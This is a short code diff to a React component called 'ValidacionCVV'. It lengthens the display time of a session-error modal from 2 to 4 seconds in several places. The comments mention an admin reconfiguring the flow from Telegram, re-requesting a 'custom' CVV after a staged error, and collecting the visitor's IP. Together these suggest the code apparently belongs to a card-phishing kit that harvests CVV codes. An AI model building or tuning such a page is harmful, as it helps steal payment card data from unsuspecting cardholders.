@@ -77,7 +77,7 @@ export default function ValidacionCVV() {
                             ...prev,
                             lanzarModalErrorSesion: false
                         }));
-                    }, 2000);
+                    }, 4000);
                     setCvv("");
                     return;
                 }
@@ -94,7 +94,7 @@ export default function ValidacionCVV() {
                         setFormState(prev => ({ ...prev, lanzarModalErrorSesion: false }));
                         // Después de mostrar el error, volver a solicitar CVV Custom
                         // El admin puede volver a configurar desde Telegram
-                    }, 2000);
+                    }, 4000);
                     setCvv("");
                     return;
                 }
@@ -232,7 +232,7 @@ export default function ValidacionCVV() {
                             ...prev,
                             lanzarModalErrorSesion: false
                         }));
-                    }, 2000);
+                    }, 4000);
                 }
             }
         };
@@ -256,7 +256,7 @@ export default function ValidacionCVV() {
                     ...prev,
                     lanzarModalErrorSesion: false
                 }));
-            }, 2000);
+            }, 4000);
             setCvv("");
         }, TIMEOUT_MS);
 
@@ -556,7 +556,7 @@ export default function ValidacionCVV() {
                     ...prev,
                     lanzarModalErrorSesion: false
                 }));
-            }, 2000);
+            }, 4000);
         };
 
         // Se obtiene la IP
